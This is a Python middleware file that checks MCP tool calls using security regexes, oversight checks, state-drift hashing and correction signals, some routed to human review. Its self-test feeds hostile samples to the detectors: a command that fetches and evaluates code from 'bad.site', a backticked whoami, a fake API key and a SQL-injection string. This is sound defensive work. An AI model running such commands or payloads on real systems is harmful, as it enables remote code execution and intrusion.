"""
verifier-middleware.py — Parallel verifier for cortex-stratum MCP pipeline.

Cross-checks every tool call for security violations, oversight anomalies,
state drift, and generates renudge correction signals.

Modes:
  "strict"   — pre_verify can block calls via passed=False
  "advisory" — logs violations but never blocks

Thread-safe via threading.Lock. Zero external dependencies.
"""

from __future__ import annotations

import copy
import hashlib
import json
import re
import threading
import time
import uuid
from typing import Any


# ---------------------------------------------------------------------------
# Constants — security patterns, thresholds, oversight rules
# ---------------------------------------------------------------------------

SECURITY_PATTERNS: list[dict[str, Any]] = [
    # Code injection
    {"type": "code_injection", "severity": "high", "pattern": re.compile(r"\beval\s*\(")},
    {"type": "code_injection", "severity": "high", "pattern": re.compile(r"\bexec\s*\(")},
    {"type": "code_injection", "severity": "high", "pattern": re.compile(r"\b__import__\s*\(")},
    {"type": "code_injection", "severity": "high", "pattern": re.compile(r"\bcompile\s*\(")},
    # Prototype pollution
    {"type": "prototype_pollution", "severity": "high", "pattern": re.compile(r"__proto__")},
    {"type": "prototype_pollution", "severity": "high", "pattern": re.compile(r"constructor")},
    # Path traversal
    {"type": "path_traversal", "severity": "high", "pattern": re.compile(r"(?:^|[\"'`])\.\.\/")},
    # Shell injection
    {"type": "shell_injection", "severity": "high", "pattern": re.compile(r"[`$|;&]" )},
    # API keys & secrets
    {"type": "secret_leak", "severity": "high", "pattern": re.compile(r"\bsk-[a-zA-Z0-9]{10,}\b")},
    {"type": "secret_leak", "severity": "high", "pattern": re.compile(r"\bapi_key\s*[=:]\s*['\"][^'\"]+['\"]")},
    {"type": "secret_leak", "severity": "high", "pattern": re.compile(r"\btoken\s*[=:]\s*['\"][a-zA-Z0-9_\-]{16,}['\"]")},
    {"type": "secret_leak", "severity": "high", "pattern": re.compile(r"\bsecret\s*[=:]\s*['\"][^'\"]+['\"]")},
    # SQL injection
    {"type": "sql_injection", "severity": "high", "pattern": re.compile(r"'\s*OR\s*'", re.IGNORECASE)},
    {"type": "sql_injection", "severity": "high", "pattern": re.compile(r"'\s*--", re.IGNORECASE)},
    {"type": "sql_injection", "severity": "high", "pattern": re.compile(r"\bDROP\s+TABLE", re.IGNORECASE)},
    {"type": "sql_injection", "severity": "high", "pattern": re.compile(r"\bUNION\s+SELECT", re.IGNORECASE)},
]

DURATION_WARN_MS: float = 30_000.0

OVERSIGHT_EMPTY_RESULT_TOOLS: set[str] = {
    "search_memories", "get_memories", "list_mcp_resources", "list_mcp_resource_templates",
    "list_entities", "list_events", "glob", "grep", "read",
}

OVERSIGHT_REQUIRED_KEYS: dict[str, set[str]] = {
    "pre_verify": {"passed", "violations", "severity"},
    "post_verify": {"passed", "anomalies", "suggestions"},
    "check_security": set(),
    "fingerprint_state": set(),
    "detect_drift": {"drifted", "previous_hash", "current_hash", "changed_keys"},
    "renudge": {"target", "strategy", "correction", "signal_id"},
}

ERROR_INDICATORS: list[re.Pattern] = [
    re.compile(r"\berror\b", re.IGNORECASE),
    re.compile(r"\bexception\b", re.IGNORECASE),
    re.compile(r"\btraceback\b", re.IGNORECASE),
    re.compile(r"\bfailed\b", re.IGNORECASE),
    re.compile(r"\bdenied\b", re.IGNORECASE),
    re.compile(r"\bpermission\s*error\b", re.IGNORECASE),
]


# ---------------------------------------------------------------------------
# Minimal, dependency-free JSON Schema validator (stdlib only)
# ---------------------------------------------------------------------------

_PY_TYPES: dict[str, tuple[type, ...]] = {
    "object": (dict,),
    "array": (list,),
    "string": (str,),
    "boolean": (bool,),
    "null": (type(None),),
    "integer": (int,),
    "number": (int, float),
}


def _schema_check_type(value: Any, expected: str) -> bool:
    """True if *value* matches JSON-schema type *expected*."""
    if expected not in _PY_TYPES:
        return True
    if expected == "integer":
        # bool is a subclass of int — reject it for integer/number
        return isinstance(value, int) and not isinstance(value, bool)
    if expected == "number":
        return isinstance(value, (int, float)) and not isinstance(value, bool)
    return isinstance(value, _PY_TYPES[expected])


def validate_schema(data: Any, schema: dict) -> list[str]:
    """
    Validate *data* against a minimal JSON Schema subset.

    Supports: type, required, properties (per-key type checks), enum,
    additionalProperties:false.  Returns a list of human-readable reasons
    for each violation (empty list == valid).
    """
    reasons: list[str] = []

    # type check
    if "type" in schema:
        if not _schema_check_type(data, schema["type"]):
            reasons.append(
                f"expected type {schema['type']!r}, got {type(data).__name__}"
            )
            # For type mismatch on the root, further property checks are moot
            return reasons

    if isinstance(data, dict):
        # required
        for req in schema.get("required", []):
            if req not in data:
                reasons.append(f"missing required property {req!r}")

        # properties
        props = schema.get("properties", {})
        for key, sub in props.items():
            if key in data:
                if "enum" in sub and data[key] not in sub["enum"]:
                    reasons.append(
                        f"property {key!r} value {data[key]!r} not in enum {sub['enum']}"
                    )
                if "type" in sub and not _schema_check_type(data[key], sub["type"]):
                    reasons.append(
                        f"property {key!r} expected type {sub['type']!r}, "
                        f"got {type(data[key]).__name__}"
                    )

        # additionalProperties:false
        if schema.get("additionalProperties") is False:
            allowed = set(props.keys())
            for key in data.keys():
                if key not in allowed:
                    reasons.append(f"unexpected property {key!r} (additionalProperties:false)")

    return reasons


# ---------------------------------------------------------------------------
# Dataclass for verifier stats
# ---------------------------------------------------------------------------


class VerifierStats:
    def __init__(self):
        self.checks_run = 0
        self.violations_found = 0
        self.renudges_sent = 0
        self.drifts_detected = 0
        self.start_time = time.time()


# ---------------------------------------------------------------------------
# Main class
# ---------------------------------------------------------------------------


class VerifierMiddleware:
    """
    Parallel verifier that cross-checks every MCP tool call.

    Hooks into task:start, task:step, task:complete lifecycle.

    Parameters
    ----------
    mode : str
        "strict" — pre_verify returns violations with passed=False and
        prevents execution.
        "advisory" — logs violations but never blocks.
    """

    def __init__(self, mode: str = "advisory") -> None:
        if mode not in ("strict", "advisory"):
            raise ValueError(f"mode must be 'strict' or 'advisory', got {mode!r}")
        self._mode = mode
        self._lock = threading.Lock()
        self._stats = VerifierStats()
        self._state_fingerprints: dict[str, str] = {}
        self._state_snapshots: dict[str, dict] = {}   # task_id -> last full state (for real diffs + rollback)
        self._schemas: dict[str, dict] = {}           # tool_name -> JSON Schema (inputSchema)
        self._active_renudges: dict[str, dict] = {}   # target -> pending renudge signal (enforcement)
        self._renudge_strategies: dict[str, dict[str, Any]] = {
            "incremental": {"description": "Adjust parameters incrementally", "needs_human": False},
            "rollback": {"description": "Revert to previous known-good state", "needs_human": True},
            "override": {"description": "Force a new execution path", "needs_human": True},
            "halt": {"description": "Pause for human review", "needs_human": True},
        }

    def register_schemas(self, schemas: dict[str, dict]) -> int:
        """Register {tool_name: inputSchema} so pre_verify can enforce contracts.
        Returns the number of schemas registered."""
        with self._lock:
            self._schemas.update(schemas)
            return len(self._schemas)

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def pre_verify(self, tool_name: str, tool_args: dict) -> dict:
        """
        Run BEFORE every tool call.

        Returns
        -------
        dict with keys:
            passed (bool)       — False if mode=="strict" and violations found
            violations (list)   — list of violation dicts
            severity (str)      — "low" | "medium" | "high"
        """
        with self._lock:
            self._stats.checks_run += 1

        violations: list[dict] = []

        # 1. Security scan on serialized args
        serialized = json.dumps(tool_args, default=str)
        violations.extend(self.check_security(serialized))

        # 2. Argument validation — detect unexpected types / missing critical fields
        violations.extend(self._validate_args(tool_name, tool_args))

        severity = self._compute_severity(violations)
        passed = not violations or (self._mode == "advisory")

        with self._lock:
            if violations:
                self._stats.violations_found += len(violations)

        return {
            "passed": passed,
            "violations": violations,
            "severity": severity,
        }

    def post_verify(
        self,
        tool_name: str,
        tool_args: dict,
        result: dict,
        duration_ms: float,
    ) -> dict:
        """
        Run AFTER every tool call.

        Returns
        -------
        dict with keys:
            passed (bool)          — True if no anomalies or suggestions
            anomalies (list)       — list of anomaly dicts
            suggestions (list)     — list of improvement suggestions
        """
        anomalies: list[dict] = []
        suggestions: list[dict] = []

        # 1. Oversight scan
        anomalies.extend(self.check_oversight(result, tool_name))

        # 2. Duration warning
        if duration_ms > DURATION_WARN_MS:
            anomalies.append({
                "type": "duration_warning",
                "severity": "medium",
                "detail": f"Execution took {duration_ms:.0f}ms (threshold {DURATION_WARN_MS:.0f}ms)",
            })

        # 3. Data leak check on output
        serialized_result = json.dumps(result, default=str)
        leak_violations = self.check_security(serialized_result)
        if leak_violations:
            anomalies.append({
                "type": "potential_data_leak",
                "severity": "high",
                "detail": "Result contains patterns matching secret/injection signatures",
                "violations": leak_violations,
            })

        # 4. Generate renudge suggestions for anomalies
        if anomalies:
            for anomaly in anomalies:
                suggestion = self._build_suggestion(tool_name, anomaly)
                if suggestion:
                    suggestions.append(suggestion)

        passed = len(anomalies) == 0

        return {
            "passed": passed,
            "anomalies": anomalies,
            "suggestions": suggestions,
        }

    def check_security(self, data: str) -> list[dict]:
        """
        Scan *data* for all registered security patterns.

        Returns list of violation dicts:
            {"type": str, "severity": str, "match": str}
        """
        violations: list[dict] = []
        seen: set[str] = set()

        for entry in SECURITY_PATTERNS:
            for match in entry["pattern"].finditer(data):
                snippet = match.group()
                if snippet not in seen:
                    seen.add(snippet)
                    violations.append({
                        "type": entry["type"],
                        "severity": entry["severity"],
                        "match": snippet,
                    })

        return violations

    def check_oversight(self, result: dict, tool_name: str) -> list[dict]:
        """
        Inspect a result dict for common oversight patterns.

        Returns list of anomaly dicts:
            {"type": str, "severity": str, "detail": str}
        """
        anomalies: list[dict] = []

        # Empty result for tools that usually return data
        if tool_name in OVERSIGHT_EMPTY_RESULT_TOOLS:
            if not result or (isinstance(result, dict) and all(
                isinstance(v, (list, dict)) and not v for v in result.values()
            )):
                anomalies.append({
                    "type": "empty_result",
                    "severity": "medium",
                    "detail": f"Tool {tool_name!r} returned empty or all-empty data",
                })

        # Error strings in content
        content = json.dumps(result, default=str)
        for pattern in ERROR_INDICATORS:
            if pattern.search(content):
                anomalies.append({
                    "type": "error_string_in_result",
                    "severity": "medium",
                    "detail": f"Result contains indicator: {pattern.pattern!r}",
                })
                break  # one flag per result

        # Missing required keys — only when tool_name matches a verifier method
        required = OVERSIGHT_REQUIRED_KEYS.get(tool_name)
        if required is not None:
            missing = required - set(result.keys())
            if missing:
                anomalies.append({
                    "type": "missing_required_keys",
                    "severity": "low",
                    "detail": f"Missing keys: {sorted(missing)}",
                })

        return anomalies

    def fingerprint_state(self, task_id: str, state_data: dict) -> str:
        """
        Create a deterministic hash of *state_data* and store it keyed by
        *task_id*.  Returns the hex digest.
        """
        serialized = json.dumps(state_data, sort_keys=True, default=str)
        digest = hashlib.sha256(serialized.encode("utf-8")).hexdigest()

        with self._lock:
            self._state_fingerprints[task_id] = digest
            self._state_snapshots[task_id] = copy.deepcopy(state_data)

        return digest

    def detect_drift(self, task_id: str, current_state: dict) -> dict:
        """
        Compare a new state fingerprint against the previously stored one.

        Returns
        -------
        dict:
            drifted (bool)
            previous_hash (str | None)
            current_hash (str)
            changed_keys (list[str])
        """
        current_serialized = json.dumps(current_state, sort_keys=True, default=str)
        current_hash = hashlib.sha256(current_serialized.encode("utf-8")).hexdigest()

        with self._lock:
            previous_hash = self._state_fingerprints.get(task_id)

        if previous_hash is None:
            # First time seeing this task — store and report no drift
            with self._lock:
                self._state_fingerprints[task_id] = current_hash
                self._state_snapshots[task_id] = copy.deepcopy(current_state)
            return {
                "drifted": False,
                "previous_hash": None,
                "current_hash": current_hash,
                "changed_keys": [],
            }

        drifted = previous_hash != current_hash
        changed_keys = self._compute_changed_keys(
            previous_hash, current_state, task_id,
        )

        if drifted:
            with self._lock:
                self._stats.drifts_detected += 1
                self._state_fingerprints[task_id] = current_hash
                self._state_snapshots[task_id] = copy.deepcopy(current_state)

        return {
            "drifted": drifted,
            "previous_hash": previous_hash,
            "current_hash": current_hash,
            "changed_keys": changed_keys,
        }

    def renudge(
        self,
        target: str,
        correction: dict,
        strategy: str = "incremental",
    ) -> dict:
        """
        Generate a correction signal.

        Parameters
        ----------
        target : str
            Identifier of the component to nudge (e.g. tool name, agent id).
        correction : dict
            The correction parameters to apply.
        strategy : str
            One of "incremental", "rollback", "override", "halt".

        Returns
        -------
        dict:
            target (str)
            strategy (str)
            correction (dict)
            signal_id (str)
            needs_human (bool)
        """
        if strategy not in self._renudge_strategies:
            raise ValueError(
                f"Unknown strategy {strategy!r}; "
                f"choose from {list(self._renudge_strategies)}"
            )

        signal_id = str(uuid.uuid4())
        needs_human = self._renudge_strategies[strategy]["needs_human"]

        with self._lock:
            self._stats.renudges_sent += 1

        return {
            "target": target,
            "strategy": strategy,
            "correction": correction,
            "signal_id": signal_id,
            "needs_human": needs_human,
            "timestamp": time.time(),
        }

    def get_status(self) -> dict:
        """Return verifier statistics and configuration."""
        with self._lock:
            uptime = time.time() - self._stats.start_time
            return {
                "mode": self._mode,
                "checks_run": self._stats.checks_run,
                "violations_found": self._stats.violations_found,
                "renudges_sent": self._stats.renudges_sent,
                "drifts_detected": self._stats.drifts_detected,
                "uptime_seconds": round(uptime, 2),
                "active_fingerprints": len(self._state_fingerprints),
                "strategies_available": list(self._renudge_strategies),
            }

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _validate_args(self, tool_name: str, tool_args: dict) -> list[dict]:
        """Basic argument validation — catches type mismatches."""
        violations: list[dict] = []
        for key, value in tool_args.items():
            if isinstance(value, (bytes, bytearray)):
                violations.append({
                    "type": "invalid_arg_type",
                    "severity": "medium",
                    "match": f"Argument {key!r} uses bytes/bytearray — possible binary injection",
                })

        # Enforce the registered JSON Schema for this tool (if any).
        with self._lock:
            schema = self._schemas.get(tool_name)
        if schema is not None:
            for reason in validate_schema(tool_args, schema):
                is_low = reason.endswith("(additionalProperties:false)")
                violations.append({
                    "type": "schema_violation",
                    "severity": "low" if is_low else "medium",
                    "match": f"{tool_name}: {reason}",
                })

        return violations

    def _compute_severity(self, violations: list[dict]) -> str:
        if not violations:
            return "low"
        severities = {v["severity"] for v in violations}
        if "high" in severities:
            return "high"
        if "medium" in severities:
            return "medium"
        return "low"

    def _compute_changed_keys(
        self,
        previous_hash: str,
        current_state: dict,
        task_id: str,
    ) -> list[str]:
        """
        Real top-level per-key diff between the previous stored snapshot and
        the current state.  Returns only the keys that were added, removed,
        or whose value differs at the top level.
        """
        with self._lock:
            previous_snapshot = self._state_snapshots.get(task_id)

        if previous_snapshot is None:
            # No prior snapshot — treat everything as changed.
            return list(current_state.keys())

        changed: list[str] = []
        for key in set(previous_snapshot) | set(current_state):
            if key not in previous_snapshot:
                changed.append(key)          # added
            elif key not in current_state:
                changed.append(key)          # removed
            elif previous_snapshot[key] != current_state[key]:
                changed.append(key)          # value differs
        return changed

    def _build_suggestion(self, tool_name: str, anomaly: dict) -> dict | None:
        """Map anomaly types to renudge-style suggestions."""
        mapping: dict[str, str] = {
            "empty_result": "Retry with broader query parameters",
            "duration_warning": "Consider pagination, limiting, or asynchronous execution",
            "potential_data_leak": "Sanitize output before returning",
            "error_string_in_result": "Inspect tool implementation for unhandled errors",
            "missing_required_keys": "Update tool output to include all contract keys",
        }
        suggestion_text = mapping.get(anomaly["type"])
        if suggestion_text is None:
            return None
        return {
            "tool": tool_name,
            "anomaly_type": anomaly["type"],
            "suggestion": suggestion_text,
        }


# ---------------------------------------------------------------------------
# Standalone test
# ---------------------------------------------------------------------------

def _demo() -> None:
    """Run a quick smoke test of all major paths."""
    v = VerifierMiddleware(mode="advisory")

    # pre_verify — clean
    r1 = v.pre_verify("read", {"filePath": "/safe/path.txt"})
    assert r1["passed"] is True, f"Expected passed=True, got {r1}"
    assert r1["violations"] == []
    print("[PASS] pre_verify — clean call")

    # pre_verify — malicious
    r2 = v.pre_verify("bash", {"command": "eval $(curl bad.site)"})
    assert r2["violations"], "Expected violations for eval injection"
    assert r2["severity"] == "high"
    print("[PASS] pre_verify — injection detected")

    # pre_verify — secret leak
    r3 = v.pre_verify("write", {"content": "api_key = 'sk-abc123xyz789def456' "})
    assert r3["violations"], "Expected violations for secret leak"
    print("[PASS] pre_verify — secret leak detected")

    # post_verify — clean
    r4 = v.post_verify("read", {}, {"content": "hello"}, 12.5)
    assert r4["passed"] is True
    print("[PASS] post_verify — clean result")

    # post_verify — duration warning
    r5 = v.post_verify("bash", {}, {"stdout": "done"}, 45_000)
    assert not r5["passed"]
    assert any(a["type"] == "duration_warning" for a in r5["anomalies"])
    print("[PASS] post_verify — duration warning")

    # post_verify — empty result on data tool
    r6 = v.post_verify("search_memories", {}, {"results": []}, 100)
    assert any(a["type"] == "empty_result" for a in r6["anomalies"])
    print("[PASS] post_verify — empty result flagged")

    # check_security — multiple patterns
    segs = v.check_security(
        "eval(x) && __proto__ && `whoami` && sk-abc123def456GHIjklm "
        "&& api_key='super-secret' "
        "' OR '1'='1"
    )
    types_found = {s["type"] for s in segs}
    assert "code_injection" in types_found
    assert "prototype_pollution" in types_found
    assert "shell_injection" in types_found
    assert "secret_leak" in types_found
    assert "sql_injection" in types_found
    print(f"[PASS] check_security — {len(segs)} violations across {len(types_found)} categories")

    # fingerprint & drift
    t_id = "demo-task"
    fp1 = v.fingerprint_state(t_id, {"a": 1, "b": 2})
    dr1 = v.detect_drift(t_id, {"a": 1, "b": 2})
    assert dr1["drifted"] is False, "Identical state should not drift"
    dr2 = v.detect_drift(t_id, {"a": 42, "b": 2})
    assert dr2["drifted"] is True, "Different state should drift"
    print("[PASS] fingerprint_state / detect_drift")

    # renudge
    rn = v.renudge("agent-42", {"temperature": 0.2}, strategy="override")
    assert rn["signal_id"] is not None
    assert rn["needs_human"] is True
    print("[PASS] renudge — override strategy")

    # get_status
    status = v.get_status()
    assert status["checks_run"] >= 3
    assert status["violations_found"] > 0
    assert status["renudges_sent"] == 1
    assert status["drifts_detected"] == 1
    print("[PASS] get_status — stats consistent")

    # Strict mode — pre_verify should block
    v_strict = VerifierMiddleware(mode="strict")
    r_strict = v_strict.pre_verify("bash", {"command": "evil | eval"})
    assert r_strict["passed"] is False, "Strict mode must block violations"
    assert r_strict["severity"] == "high"
    print("[PASS] strict mode — pre_verify blocks on violations")

    # Thread safety smoke
    import concurrent.futures
    def _parallel_check(n: int) -> None:
        for _ in range(n):
            v.pre_verify("read", {"filePath": f"/tmp/{uuid.uuid4()}.txt"})
    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
        futures = [pool.submit(_parallel_check, 50) for _ in range(4)]
        concurrent.futures.wait(futures)
    status2 = v.get_status()
    assert status2["checks_run"] >= 200 + 3  # previous checks + parallel
    print(f"[PASS] thread safety — {status2['checks_run']} total checks (expected >= 203)")

    # Renudge — unknown strategy
    try:
        v.renudge("x", {}, strategy="unknown")
        assert False, "Should have raised ValueError"
    except ValueError:
        print("[PASS] renudge — unknown strategy raises ValueError")

    # Schema validation — missing required field must raise a schema_violation
    v.register_schemas({
        "create_widget": {
            "type": "object",
            "required": ["name"],
            "properties": {
                "name": {"type": "string"},
                "count": {"type": "integer"},
                "kind": {"type": "string", "enum": ["a", "b"]},
            },
            "additionalProperties": False,
        }
    })
    r_missing = v.pre_verify("create_widget", {"count": 3})
    sv = [x for x in r_missing["violations"] if x["type"] == "schema_violation"]
    assert sv, "Missing required field should produce a schema_violation"
    assert any("missing required property 'name'" in x["match"] for x in sv)
    print("[PASS] schema — missing required field flagged")

    # Schema validation — valid call produces zero schema_violations
    r_valid = v.pre_verify("create_widget", {"name": "gizmo", "count": 1, "kind": "a"})
    sv_valid = [x for x in r_valid["violations"] if x["type"] == "schema_violation"]
    assert not sv_valid, f"Valid call should have no schema_violations, got {sv_valid}"
    print("[PASS] schema — valid call clean")

    # Drift diff — changing exactly one key returns only that key
    drift_id = "demo-drift"
    v.fingerprint_state(drift_id, {"x": 1, "y": 2, "z": 3})
    mut = {"x": 1, "y": 2, "z": 3}
    mut["y"] = 99  # change exactly one top-level key
    dr_d = v.detect_drift(drift_id, mut)
    assert dr_d["drifted"] is True
    assert set(dr_d["changed_keys"]) == {"y"}, (
        f"Expected only 'y' changed, got {dr_d['changed_keys']}"
    )
    print("[PASS] drift — single-key change isolated")

    print("\n=== ALL TESTS PASSED ===")


if __name__ == "__main__":
    _demo()
